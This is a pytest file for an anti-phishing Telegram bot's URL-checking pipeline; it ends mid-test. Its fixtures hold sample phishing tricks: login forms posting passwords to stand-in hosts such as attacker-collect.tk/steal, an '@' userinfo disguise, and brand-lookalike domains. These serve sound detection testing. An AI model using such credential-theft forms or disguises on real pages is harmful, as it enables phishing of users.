"""
tests/test_pipeline.py
==========================
Offline unit tests for the link-checking pipeline. No network access
is needed: network/domain checks are exercised via monkeypatched
fakes so the merged-verdict logic can be verified deterministically.
"""

import asyncio
import datetime

import pytest
from telegram import Chat, Message, MessageEntity

from bot.detectors.url import pipeline
from bot.detectors.url.online import network, threat_intel
from bot.detectors.url.offline import vectors
from bot.detectors.url.offline.lexical import (
    check_anchor_mismatch,
    check_url,
    domain_entropy,
    extract_urls,
    has_malformed_protocol,
    registered_domain,
)
from bot.handlers.url_handler import extract_text_link_entities


# --- lexical analyzer (existing behaviour, still intact) ---------------

def test_extract_urls_finds_bare_and_full_links():
    urls = extract_urls("see https://ababank.com or bit.ly/x9 and mail me")
    assert any("ababank.com" in u for u in urls)
    assert any("bit.ly" in u for u in urls)


def test_extract_urls_preserves_userinfo_credential_trick():
    # Regression: extract_urls() used to silently truncate past '@'
    # (treating it as pure URL syntax), handing check_url() only the
    # real destination and losing the exact evidence its own '@'
    # check depends on - making that check permanently unreachable via
    # normal message scanning. The classic trick: a real-looking brand
    # domain before '@', the actual destination after it.
    urls = extract_urls("go to real-bank.com@evil-site.tk now")
    assert urls == ["real-bank.com@evil-site.tk"]  # one match, not truncated to "evil-site.tk"

    v = check_url(urls[0])
    assert v["host"] == "evil-site.tk"  # that's genuinely where a click would land
    assert any("trick to hide the real destination" in r for r in v["reasons"])


def test_extract_urls_userinfo_trick_works_bare_too():
    # No scheme, no path - still must not be silently dropped, since
    # extract_urls() already treats bare domains as checkable links
    # elsewhere; "abab@nk.com" also happens to de-leet to
    # "ababank.com" ('@' -> 'a'), a second, independent red flag on
    # top of the '@' trick itself.
    urls = extract_urls("abab@nk.com")
    assert urls == ["abab@nk.com"]
    v = check_url(urls[0])
    assert v["level"] != "safe"


def test_check_url_flags_raw_ip():
    v = check_url("http://192.168.13.37/login")
    assert v["level"] != "safe"


def test_extract_urls_finds_bare_ip_with_no_path():
    # Real, confirmed bug: the domain-host branch's final label must be
    # [a-z]{2,24} (letters only) - an IPv4 address's last octet is
    # always digits, so no backtracking position could ever satisfy it.
    # A bare IP with nothing after it that regex could accidentally
    # latch onto instead returned NO match at all - extract_urls() saw
    # nothing, so a message containing a real IP-hosted link got zero
    # scrutiny, not even a low score. Confirmed live before the fix:
    # check_url() alone (test above) correctly flags a raw IP, but
    # extract_urls() never handed it one to check in the first place.
    assert extract_urls("http://203.0.113.5/") == ["http://203.0.113.5/"]
    assert extract_urls("check this out http://203.0.113.5") == ["http://203.0.113.5"]


def test_extract_urls_finds_ip_with_extensionless_path():
    # Same bug, different symptom: a path segment with no dot in it
    # ("login", not "login.php") gave the old regex nothing else to
    # latch onto either, so the whole URL vanished rather than being
    # partially mis-extracted.
    assert extract_urls("http://203.0.113.5/admin/12345") == ["http://203.0.113.5/admin/12345"]
    assert extract_urls("http://203.0.113.5:8080/login") == ["http://203.0.113.5:8080/login"]


def test_extract_urls_does_not_truncate_ip_to_trailing_path_segment():
    # The most dangerous symptom: with a dotted-extension path segment
    # present, the old regex didn't just miss the IP - it silently
    # matched ONLY "login.php" as if that were the entire URL, discarding
    # the real host and most of the path. check_message_full would then
    # score a fake host ("login.php", not even the real destination)
    # instead of the actual IP-hosted link.
    urls = extract_urls("http://203.0.113.5/secure/login.php")
    assert urls == ["http://203.0.113.5/secure/login.php"]

    v = check_url(urls[0])
    assert v["host"] == "203.0.113.5"
    assert any("raw IP address" in r for r in v["reasons"])


def test_extract_urls_ip_fix_does_not_regress_domain_extraction():
    # The IPv4 alternative must not change how ordinary domain-shaped
    # hosts are matched - "203.example.com" has digit-only labels too,
    # but its final label ("com") is letters, so it must still go
    # through the domain branch, not be mistaken for a malformed IP.
    assert extract_urls("see 203.example.com") == ["203.example.com"]


def test_registered_domain_handles_multi_level_suffix():
    assert registered_domain("www.bank.com.kh") == "bank.com.kh"
    assert registered_domain("mail.google.com") == "google.com"


# --- URL string entropy ---------------------------------------------------

def test_domain_entropy_higher_for_diverse_characters():
    # Not a claim that entropy alone separates random from real (it
    # doesn't reliably at domain-name lengths - see the digit-gating
    # test below) - just checking the raw math does what it says.
    assert domain_entropy("aaaaaaaa") == 0.0
    assert domain_entropy("ab12cd34") > domain_entropy("aaaacccc")


def test_check_url_flags_digit_mixed_random_domain():
    v = check_url("http://xk4j9fzqp2m.tk/login")
    assert any("randomly generated" in r for r in v["reasons"])


def test_check_url_does_not_flag_real_words_as_random():
    # The false-positive case entropy-alone would get wrong: a real
    # dictionary word can have higher raw character diversity than a
    # short random string, but it never mixes digits into the name.
    for url in (
        "https://ababank.com",
        "https://subscription-service.com",
        "https://verification-portal.com",
    ):
        v = check_url(url)
        assert not any("randomly generated" in r for r in v["reasons"]), url


def test_check_url_skips_entropy_when_already_a_brand_disguise():
    # "paypal-4x7k9m2p" clears both the length and digit-mix gates and
    # would score above the entropy threshold on its own (verified:
    # ~3.46 bits/char) - but since the brand-buried check already
    # fires on it, it should get that ONE reason, not a second
    # redundant "looks random" reason stacked on top.
    v = check_url("http://paypal-4x7k9m2p.com/login")
    reasons_text = " ".join(v["reasons"])
    assert "PayPal" in reasons_text
    assert "randomly generated" not in reasons_text


def test_check_url_ignores_suspicious_word_buried_in_an_unrelated_word():
    # Real false positive, confirmed live via the verified-safe-link
    # corpus test: this exact URL (an ordinary FreeBSD blog post)
    # scored "Dangerous" partly because SUSPICIOUS_URL_WORDS' "free"
    # matched as a plain substring of "freebsd" - nothing to do with
    # the scam-word meaning of "free". Same bug class as buried brand
    # names, just in the scam-word list instead of PROTECTED_BRANDS.
    v = check_url("https://vermaden.wordpress.com/2026/09/06/amd-based-freebsd-desktop-reloaded/")

    assert not any("scam-typical words" in r for r in v["reasons"])


def test_check_url_still_flags_a_real_standalone_suspicious_word():
    # The word-boundary fix must not silently stop catching the real
    # case: a suspicious word as its own path segment (the way an
    # actual phishing link uses it) still has to fire.
    v = check_url("http://some-bank-lookalike.example/verify-account")

    assert any("scam-typical words" in r and "verify" in r for r in v["reasons"])


def test_check_url_does_not_flag_a_brands_own_second_domain():
    # Real false positive, confirmed live: telegram.me is Telegram's own
    # original domain (still real, still Telegram-operated - serves the
    # identical channel-preview content t.me does) and scored
    # 80/dangerous, "mentions telegram but the real domain is
    # telegram.me, not Telegram's official site" - the buried-name check
    # was comparing it only against the telegram.org entry, with no way
    # to know telegram.me is ALSO a real Telegram domain. t.me (what
    # nearly every real Telegram link actually looks like) is the other
    # half of the same real gap.
    for url in ("https://telegram.me/telegram", "https://t.me/durov"):
        v = check_url(url)
        assert not any("not the official" in r or "disguised copy" in r for r in v["reasons"]), url


def test_check_url_does_not_flag_unrelated_short_domains_as_typosquats():
    # Real false positive, confirmed live: adding "t.me" to
    # PROTECTED_BRANDS (see above) made m.me - Messenger's own real
    # message-link domain, used on every Facebook Page's "Send Message"
    # button - score 80/dangerous as "a fake of Telegram (t.me)", since
    # edit-distance(m.me, t.me) == 1. fb.com and fb.me (Facebook's own
    # real domains) hit the SAME bug against x.com and t.me respectively
    # (distance 2 each) - fb.com vs x.com is not even new, x.com has
    # been in PROTECTED_BRANDS since before this session; it just never
    # got tested against a short unrelated domain until now.
    # MIN_TYPOSQUAT_DOMAIN_LENGTH is the general fix - these three are
    # now also their own recognized brand domains (see reference_data.py),
    # so this test pins the general length-guard specifically, using
    # domains that are NOT themselves in PROTECTED_BRANDS, to prove the
    # guard (not just the self-match short-circuit) is doing the work.
    for url in ("http://m.mx", "http://fb.io", "http://fb.co"):
        v = check_url(url)
        assert not any("looks like a fake of" in r for r in v["reasons"]), url


def test_check_url_still_flags_typosquats_of_normal_length_brands():
    # The length guard must not silently disable typosquat detection for
    # every OTHER brand - only the two outlier short domains (t.me,
    # x.com) are exempt from it. "paypai.com" (l -> i, not a leetspeak
    # substitution) isolates the Levenshtein branch specifically from
    # the separate exact-match-after-deleet "disguised copy" branch.
    v = check_url("http://paypai.com/")

    assert any("looks like a fake of" in r for r in v["reasons"])


# --- anchor-text mismatch (Telegram text_link entities) -------------------

def test_check_anchor_mismatch_flags_url_shaped_display_text():
    result = check_anchor_mismatch("https://ababank.com", "http://ababank-secure-login.tk/verify")
    assert result is not None
    points, reason = result
    assert points > 0
    assert "ababank.com" in reason
    assert "ababank-secure-login.tk" in reason


def test_check_anchor_mismatch_ignores_ordinary_link_text():
    # "Click here" isn't URL-shaped, so there's nothing to compare -
    # this must NOT flag every normal hyperlink in existence.
    assert check_anchor_mismatch("Click here for your account", "http://ababank-secure-login.tk/verify") is None


def test_check_anchor_mismatch_allows_matching_domains():
    assert check_anchor_mismatch("https://ababank.com/login", "https://ababank.com/login?ref=sms") is None


# --- malformed-protocol links (mentor-flagged: "http//"/"https//") -------

def test_has_malformed_protocol_flags_missing_colon():
    assert has_malformed_protocol("check this out http//free-prize-winner.tk/claim")
    assert has_malformed_protocol("go to https//free-prize-winner.tk/claim now")


def test_has_malformed_protocol_ignores_well_formed_links():
    assert not has_malformed_protocol("visit http://ababank.com safely")
    assert not has_malformed_protocol("visit https://ababank.com safely")
    assert not has_malformed_protocol("plain text with no link at all")


# --- embeddings & vector search -----------------------------------------

def test_embed_is_normalized_and_deterministic():
    a = vectors.embed("secure-login-verify-account.tk")
    b = vectors.embed("secure-login-verify-account.tk")
    norm = sum(v * v for v in a.values()) ** 0.5
    assert a == b
    assert pytest.approx(norm, abs=1e-6) == 1.0


def test_cosine_similarity_orders_phish_above_unrelated():
    phish = vectors.embed("ababank-secure-login.verify-account.tk")
    pattern = vectors.embed("acledabank-secure-login.verify-account.tk")
    unrelated = vectors.embed("cooking-recipes-chocolate-cake.blog")

    sim_phish = vectors.cosine(phish, pattern)
    sim_other = vectors.cosine(phish, unrelated)
    assert sim_phish > sim_other


@pytest.mark.asyncio
async def test_vector_store_roundtrip(fake_vector_store):
    # upsert_vector/nearest are async and Postgres-backed now (see
    # tests/conftest.py) - fake_vector_store implements the exact same
    # contract in-memory with the real embed()/cosine() math, so this
    # still tests a genuine write-then-read round trip, offline.
    await fake_vector_store.upsert_vector("phish", "fake-a.tk", "ababank-secure-login.tk")
    await fake_vector_store.upsert_vector("brand", "ababank.com", "ababank.com", "ABA Bank")

    hits = await fake_vector_store.nearest("ababank-secure-login.tk", k=2)
    kinds = [kind for _, kind, _, _ in hits]
    assert "phish" in kinds
    # Querying the official domain itself must rank the brand vector first.
    hits = await fake_vector_store.nearest("ababank.com", k=1)
    assert hits[0][2] == "ababank.com"
    assert hits[0][0] == pytest.approx(1.0, abs=1e-5)


@pytest.mark.asyncio
async def test_ensure_seeded_survives_a_db_failure(monkeypatch):
    # Regression found by /code-review: seed_vectors() used to be called
    # directly at every handler call site with zero exception handling -
    # a Supabase outage on the first message after a restart would crash
    # handle_text/handle_url/handle_business_message uncaught, giving the
    # user/owner zero reply. ensure_seeded() must
    # swallow the failure and leave bot_data unmarked so the next
    # message simply retries.
    async def _boom():
        raise RuntimeError("Supabase unreachable")

    monkeypatch.setattr(vectors, "seed", _boom)

    bot_data = {}
    await vectors.ensure_seeded(bot_data)  # must not raise

    assert "_vectors_seeded" not in bot_data


@pytest.mark.asyncio
async def test_ensure_seeded_is_idempotent_once_it_succeeds(fake_vector_store, monkeypatch):
    bot_data = {}
    await vectors.ensure_seeded(bot_data)
    assert bot_data["_vectors_seeded"] is True

    # A second call must not re-seed (no-op if already marked done).
    called = {"n": 0}

    async def _spy():
        called["n"] += 1

    monkeypatch.setattr(vectors, "seed", _spy)
    await vectors.ensure_seeded(bot_data)

    assert called["n"] == 0


@pytest.mark.asyncio
async def test_ensure_seeded_serializes_concurrent_callers(monkeypatch):
    # Real, confirmed bug (2026-09-11): right after a restart, EVERY
    # handler calls ensure_seeded() before its real work - a burst of
    # messages arriving in that window (a queued backlog delivering all
    # at once, seen live repeatedly this session) used to see
    # bot_data['_vectors_seeded'] still unset in EVERY concurrent call
    # and each launch its own full seed() - several concurrent 144+-row
    # batch upserts competing for the pool's 5 connections at once, a
    # real, confirmed cause of the "Supabase pool exhausted" admin
    # alerts. _seed_lock must ensure only ONE seed() actually runs even
    # when many callers race for it.
    called = {"n": 0}

    async def _slow_seed():
        # A real seed() call is genuinely slow (network round trips) -
        # the delay here is what actually exercises the race window;
        # without the lock, every concurrent caller would see the flag
        # still unset and all call this concurrently.
        called["n"] += 1
        await asyncio.sleep(0.05)

    monkeypatch.setattr(vectors, "seed", _slow_seed)

    bot_data = {}
    await asyncio.gather(*(vectors.ensure_seeded(bot_data) for _ in range(10)))

    assert called["n"] == 1
    assert bot_data["_vectors_seeded"] is True


def test_ensure_seeded_lock_works_across_separate_event_loops(monkeypatch):
    # Regression (found by /code-review): _seed_lock used to be a single
    # asyncio.Lock() created once at import time. asyncio.Lock only
    # actually binds itself to an event loop the first time it's
    # genuinely CONTENDED - harmless in production (one long-lived event
    # loop for the whole process) but a real landmine here: pytest-asyncio
    # gives every test its own fresh event loop by default, and the test
    # above this one already contends this exact lock. Without a per-loop
    # rebind, a later contention from a DIFFERENT loop crashes with
    # "Lock is bound to a different event loop" - a failure that looks
    # completely unrelated to its real cause. Reproduces the two-separate
    # -loops scenario directly rather than relying on test collection
    # order to happen to trigger it.
    called = {"n": 0}

    async def _slow_seed():
        called["n"] += 1
        await asyncio.sleep(0.01)

    monkeypatch.setattr(vectors, "seed", _slow_seed)

    async def _contend():
        bot_data = {}
        await asyncio.gather(*(vectors.ensure_seeded(bot_data) for _ in range(5)))
        return bot_data

    first = asyncio.run(_contend())   # binds the lock to loop #1
    second = asyncio.run(_contend())  # must not crash against loop #1's binding

    assert first["_vectors_seeded"] is True
    assert second["_vectors_seeded"] is True
    assert called["n"] == 2


# --- MinHash LSH ---------------------------------------------------------

def test_minhash_detects_near_duplicate_pages():
    body = "<html>" + ("buy now cheap watches limited offer " * 200) + "</html>"
    slightly_different = body.replace("cheap", "cheaper") + "<p>footer</p>"
    different = "<html>" + ("weather forecast today sunny mild " * 200) + "</html>"

    sig_a = vectors.minhash_signature(body)
    sig_dup = vectors.minhash_signature(slightly_different)
    sig_diff = vectors.minhash_signature(different)

    # Tiny texts make MinHash sensitive, so a single-word edit costs
    # more similarity here than it would on real full pages.
    assert vectors.minhash_similarity(sig_a, sig_dup) > 0.6
    assert vectors.minhash_similarity(sig_a, sig_diff) < 0.3


# --- page text extraction -------------------------------------------------

def test_extract_page_text_strips_scripts():
    html = "<html><head><title>ABA Bank - Login</title></head>" \
           "<body><script>evil()</script><p>Welcome please log in</p></body></html>"
    text = network.extract_page_text(html)
    assert "ABA Bank" in text
    assert "evil()" not in text


# --- form/password field detection -----------------------------------------

def test_has_password_field_detects_login_form():
    html = '<form><input type="text" name="u"><input type="password" name="p"></form>'
    assert network.has_password_field(html)


def test_has_password_field_false_when_absent():
    assert not network.has_password_field("<form><input type='text'></form>")


def test_find_form_actions_extracts_targets():
    html = '<form action="https://attacker.tk/steal"></form><form action="/login"></form>'
    assert network.find_form_actions(html) == ["https://attacker.tk/steal", "/login"]


# --- caption blindness fix (photo/document TEXT_LINK entities) -----------

def _caption_message(caption: str, entities: list[MessageEntity]) -> Message:
    return Message(
        message_id=1,
        date=datetime.datetime.now(),
        chat=Chat(id=1, type=Chat.PRIVATE),
        caption=caption,
        caption_entities=entities,
        text=None,
    )


def test_extract_text_link_entities_reads_caption_entities():
    # Regression: a photo/document caption hides its TEXT_LINK entity in
    # message.caption_entities, not message.entities - a message with no
    # .text used to make this helper (and handle_url entirely) blind to
    # a "Click here"-style deceptive link attached to a file/photo.
    caption = "Click here"
    entity = MessageEntity(
        type=MessageEntity.TEXT_LINK, offset=0, length=len(caption),
        url="http://free-prize-winner.tk/claim",
    )
    message = _caption_message(caption, [entity])

    assert extract_text_link_entities(message) == [
        ("Click here", "http://free-prize-winner.tk/claim")
    ]


def test_extract_text_link_entities_empty_for_plain_caption():
    message = _caption_message("just a normal caption, no link", [])
    assert extract_text_link_entities(message) == []


# --- orchestrator merge logic (network faked) -----------------------------

@pytest.fixture(autouse=True)
def _no_real_tls_handshakes(monkeypatch):
    """cert_issued_days_ago does a REAL TLS handshake (ssl/socket, up to
    an 8s timeout per unresolvable host) - autouse so every test in this
    file gets a fast, deterministic stub without each one needing to
    remember it, the same way domain_age_days/resolve_host are stubbed
    per-test below. Individual tests can still override this via their
    own monkeypatch.setattr if they specifically want to test cert-age
    scoring.
    """
    async def fake_cert_age(host, port=443):
        return None
    monkeypatch.setattr(pipeline, "cert_issued_days_ago", fake_cert_age)


class _FakeNet:
    def __init__(self, **overrides):
        self.result = {
            "requested_url": "http://bit.ly/x9",
            "final_url": "http://bit.ly/x9",
            "redirect_chain": [],
            "cross_domain_redirect": False,
            "reachable": False,
            "status": None,
            "tls_valid": None,
            "server": None,
            "content_type": None,
            "page_html": "",
            "page_text": "",
            "error": None,
        }
        self.result.update(overrides)


# seeded_vectors fixture now lives in tests/conftest.py (shared, and
# backed by an in-memory fake store since url_vectors moved to
# Supabase Postgres - see that file's docstring for why).


def _stub_out_network(monkeypatch, tls_valid=True):
    """Minimal network/DNS/age stubs for tests that only care about the
    lexical/anchor-mismatch signal, not the network layer."""
    async def fake_trace(url):
        return _FakeNet(reachable=True, status=200, tls_valid=tls_valid).result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["103.1.2.3"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)


def test_analyze_url_flags_cross_domain_credential_exfiltration(seeded_vectors, monkeypatch):
    # The actual "form action inspection" case: a login form that's
    # visually on the scanned page but POSTs the password somewhere
    # else entirely - the pattern a fake login page needs to work.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="http://ababank-login.tk/",
        page_html='<form action="https://attacker-collect.tk/steal" method="post">'
                   '<input type="password" name="pass"></form>',
        page_text="please enter your password to continue",
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("http://ababank-login.tk/"))

    assert any("credential-theft pattern" in r for r in verdict["reasons"])
    assert any("attacker-collect.tk" in r for r in verdict["reasons"])


def test_analyze_url_does_not_flag_same_origin_login_form(seeded_vectors, monkeypatch):
    # A login form that submits back to its own page/domain is
    # completely normal - must not be flagged just for existing.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="https://www.some-real-shop.com/",
        page_html='<form action="/login" method="post">'
                   '<input type="password" name="pass"></form>'
                   + ("Welcome to our shop. " * 30),  # clear the near-dup length gate
        page_text="Welcome to our shop, please log in. " * 30,
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return 900

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("https://www.some-real-shop.com/"))

    assert not any("credential-theft pattern" in r for r in verdict["reasons"])


def test_analyze_url_marks_evidence_degraded_when_supabase_down_and_result_uncertain(seeded_vectors, monkeypatch):
    # Real user/mentor spec (2026-09-11): a Supabase/vector-search outage
    # should only surface a "server had difficulties" notice to the user
    # when it could plausibly have mattered - not on every blip, since
    # it's only ONE of several signal sources and most checks stay
    # confident without it. This is the "could have mattered" case: no
    # VirusTotal confirmation, and the level ends up non-safe.
    async def failing_nearest(text, k=4, kinds=None):
        raise ConnectionError("Supabase pool exhausted")

    _stub_out_network(monkeypatch, tls_valid=True)
    monkeypatch.setattr(pipeline.vectors, "nearest", failing_nearest)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url(
        "http://totally-not-a-bank-login.tk/verify-account", malformed_protocol=True,
    ))

    assert verdict["level"] != "safe"
    assert not any("VirusTotal" in r for r in verdict["reasons"])
    assert verdict["evidence_degraded"] is True
    # And the actual reply text carries the fixed, translated notice -
    # not just an internal flag nobody ever surfaces.
    reply = pipeline.format_verdict_full(verdict, include_evidence=False)
    assert "server has experienced some difficulties" in reply


def test_analyze_url_does_not_mark_evidence_degraded_when_verdict_is_confident(seeded_vectors, monkeypatch):
    # Same Supabase outage, but VirusTotal independently confirms the
    # link is malicious - the verdict is already fully confident, so the
    # notice would be misleading noise, not real information.
    async def failing_nearest(text, k=4, kinds=None):
        raise ConnectionError("Supabase pool exhausted")

    async def fake_lookup(url, api_key, live=True):
        return {"malicious": 5, "suspicious": 0, "harmless": 10, "total": 15}

    _stub_out_network(monkeypatch, tls_valid=True)
    monkeypatch.setattr(pipeline.vectors, "nearest", failing_nearest)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", "fake-key")
    monkeypatch.setattr(pipeline.threat_intel, "lookup", fake_lookup)

    verdict = asyncio.run(pipeline.analyze_url("http://real-malware-host.tk/payload"))

    assert any("VirusTotal" in r for r in verdict["reasons"])
    assert verdict["evidence_degraded"] is False


def test_analyze_url_does_not_mark_evidence_degraded_when_result_is_safe(seeded_vectors, monkeypatch):
    # Same Supabase outage, but nothing else found anything wrong either
    # - a clean result doesn't need hedging just because one of several
    # signal sources was briefly unavailable.
    async def failing_nearest(text, k=4, kinds=None):
        raise ConnectionError("Supabase pool exhausted")

    async def fake_age(host):
        return 900  # long-established domain

    _stub_out_network(monkeypatch, tls_valid=True)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline.vectors, "nearest", failing_nearest)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("https://www.some-real-shop.com/"))

    assert verdict["level"] == "safe"
    assert verdict["evidence_degraded"] is False


def test_analyze_url_flags_brand_page_spoof(seeded_vectors, monkeypatch):
    # _brand_page_spoof: the page CLAIMS to be a protected brand (ABA
    # Bank mentioned 3+ times) while living on an unrelated domain -
    # the semantic-impersonation case lexical/vector checks alone can't
    # prove. Zero prior coverage on this detector.
    #
    # Domain deliberately does NOT itself contain "ababank" (unlike
    # e.g. "ababank-secure-verify.tk") - this isolates the PAGE-CONTENT
    # detector from the separate URL-TEXT brand/typosquat detector
    # (already covered by test_check_anchor_mismatch_*), which would
    # otherwise also fire and make it unclear which detector produced
    # the flag. The brand keyword itself is matched WITHOUT a space
    # (PROTECTED_BRANDS' "ababank.com" splits to "ababank") - real
    # phishing page text won't always have that exact casing/spacing,
    # but this pins the detector's actual current matching behavior.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="http://totally-unrelated-domain.tk/",
        page_text="Welcome to AbaBank online banking. AbaBank keeps your money safe. "
                   "Log in to your AbaBank account now.",
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("http://totally-unrelated-domain.tk/"))

    assert any("ABA Bank" in r and "not the official" in r for r in verdict["reasons"])


def test_analyze_url_does_not_flag_brand_spoof_below_the_mention_threshold(seeded_vectors, monkeypatch):
    # Negative case: 2 mentions is below BRAND_PAGE_SPOOF_MIN (3) - must
    # NOT fire, or this detector would false-positive on any page that
    # merely references a bank's name in passing (e.g. a news article).
    # Same no-space "AbaBank" keyword form as the positive test above,
    # so this genuinely tests the count-threshold boundary (2 vs 3), not
    # just "a space breaks matching" (which the positive test's fix
    # already covers separately).
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="http://some-news-site.example/",
        page_text="AbaBank announced new hours today. AbaBank customers should note the change.",
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return None

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("http://some-news-site.example/"))

    assert not any("not the official" in r for r in verdict["reasons"])


def test_analyze_url_does_not_flag_brand_page_spoof_on_the_brands_own_second_domain(seeded_vectors, monkeypatch):
    # Real false positive, confirmed live: telegram.me is Telegram's own
    # original domain (still real, still Telegram-operated) - a real
    # fetch of telegram.me/telegram returns Telegram's own genuine
    # channel-preview page, which of course mentions "Telegram" many
    # times, and _brand_page_spoof used to read that as impersonating
    # telegram.org (the only Telegram domain PROTECTED_BRANDS knew
    # about). Now that telegram.me/t.me are their own PROTECTED_BRANDS
    # entries, is_official_brand is True for them, which gates
    # _brand_page_spoof out entirely (same protection telegram.org
    # itself already had) - this proves that gate actually covers a
    # brand's OTHER real domain too, not just its canonical one.
    fake = _FakeNet(
        reachable=True, status=200, tls_valid=True,
        final_url="https://telegram.me/telegram",
        page_text="Telegram: View @telegram. The official Telegram on Telegram. "
                   "Telegram News. 9,614,677 subscribers. View in Telegram.",
    )

    async def fake_trace(url):
        return fake.result

    async def fake_age(host):
        return 3000

    async def fake_resolve(host):
        return ["1.2.3.4"]

    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)

    verdict = asyncio.run(pipeline.analyze_url("https://telegram.me/telegram"))

    assert not any("presents itself as" in r or "not the official" in r for r in verdict["reasons"])
    assert verdict["level"] == "safe"


def test_brand_page_spoof_ignores_short_brand_names():
    # Regression: PROTECTED_BRANDS' "x.com" derives the single-letter
    # brand keyword "x" (domain.split(".")[0]) - a raw substring count
    # of "x" trips on ordinary English text ("example", "text", "next")
    # with no real impersonation involved. Confirmed live: example.com's
    # own generic placeholder page tripped this before the length guard
    # (lexical.py's own analogous buried-brand-name check already has
    # the same `len(brand_name) >= 4` guard - this pins pipeline.py's
    # version to match it).
    ordinary_text = "For example, the next text box has extra context and taxable expenses."
    assert ordinary_text.lower().count("x") >= 3  # sanity: this really would have tripped pre-fix

    result = pipeline._brand_page_spoof(ordinary_text, "totally-unrelated-domain.tk", 0.0)

    assert result is None


def test_brand_page_spoof_still_fires_for_normal_length_brand_names():
    # Same fix must not silently break real detection for ordinary
    # (non-single-letter) brand names - ABA Bank mentioned 3+ times
    # while hosted elsewhere must still be flagged.
    result = pipeline._brand_page_spoof(
        "Welcome to AbaBank online banking. AbaBank keeps your money safe. "
        "Log in to your AbaBank account now.",
        "totally-unrelated-domain.tk",
        0.0,
    )

    assert result is not None
    assert "ABA Bank" in result and "not the official" in result


def test_brand_page_spoof_ignores_topical_mentions_with_no_portal_language():
    # Real false positive, confirmed live: broryat.tech is a legitimate
    # anti-scam Telegram bot's own site - it mentions "Telegram" many
    # times because its whole product IS a Telegram bot, with zero
    # domain resemblance to telegram.org (real similarity: 0.152, well
    # below BRAND_SIM_THRESHOLD) and no login/account-portal framing at
    # all. Brand-keyword count alone must not be enough once there's no
    # corroborating signal that the page presents itself AS the brand.
    real_world_text = (
        "Broryat | AI Bot protecting you from online scams. Beware on Telegram! "
        "Just send Broryat a suspicious link, message, or file on Telegram and it "
        "analyzes the risk for you. Scan links and files shared on Telegram using "
        "VirusTotal. Connect Broryat via Telegram Chat Automation to monitor your "
        "private chat. Search for the official Bot, open Telegram and look for "
        "@broryat_bot to get started."
    )
    assert real_world_text.lower().count("telegram") >= 3  # sanity: clears BRAND_PAGE_SPOOF_MIN

    result = pipeline._brand_page_spoof(real_world_text, "broryat.tech", 0.152)

    assert result is None


def test_brand_page_spoof_fires_on_domain_resemblance_even_without_portal_language():
    # The other half of the two-signal design: a real typosquat domain
    # (high best_brand_sim) must still be enough on its own, even if the
    # page text happens to lack obvious login/portal phrasing.
    result = pipeline._brand_page_spoof(
        "Telegram Telegram Telegram - the fastest messaging app, join millions of users today.",
        "telegram-app.tk",
        pipeline.BRAND_SIM_THRESHOLD,
    )

    assert result is not None
    assert "Telegram" in result and "not the official" in result


def test_brand_page_spoof_ignores_generic_ui_phrases_removed_from_the_list():
    # Real false positive, confirmed live via the verified-safe-link
    # corpus test: github.com/tensorflow/tensorflow and
    # github.com/sindresorhus/awesome both got flagged as "presents
    # itself as Google" because "Google" is mentioned 3+ times in
    # ordinary docs/README text AND GitHub's own unauthenticated-page
    # chrome says "Sign in" - a phrase that used to be in
    # BRAND_SPOOF_PORTAL_PHRASES but is generic site navigation, not
    # login/account-portal framing about the brand being impersonated.
    text = (
        "Sign in "
        "TensorFlow is an end-to-end open source platform for machine "
        "learning, originally developed by researchers at Google. Google "
        "also maintains Google Colab notebooks for running examples."
    )
    assert text.lower().count("google") >= 3  # sanity: clears BRAND_PAGE_SPOOF_MIN

    result = pipeline._brand_page_spoof(text, "github.com", 0.0)

    assert result is None


def test_brand_page_spoof_ignores_portal_phrase_far_from_any_brand_mention():
    # The proximity half of the same false-positive class: even a phrase
    # still in BRAND_SPOOF_PORTAL_PHRASES ("online banking") existing
